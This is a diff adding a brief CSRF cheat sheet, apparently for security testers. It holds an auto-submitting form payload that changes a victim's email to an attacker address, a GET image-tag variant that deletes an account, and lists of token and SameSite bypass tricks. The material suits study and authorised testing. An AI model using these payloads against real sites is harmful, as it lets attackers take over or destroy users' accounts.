@@ -1,0 +1,14 @@
+CSRF — QUICK REF
+
+Requires: state-changing action + cookie-only session + no unpredictable token
+
+PoC (auto-submit POST):
+  <form action="http://<target>/account/email" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.com"></form>
+  <script>document.forms[0].submit()</script>
+GET variant:  <img src="http://<target>/account/delete?id=5">
+
+Token bypass:  remove it | empty | your own token | reuse | POST->GET | leaked in page
+SameSite=Lax:  top-level GET nav | make it a GET | on-site gadget | sibling subdomain
+JSON endpoint: enctype="text/plain" to smuggle JSON
+Tool: Burp → Generate CSRF PoC
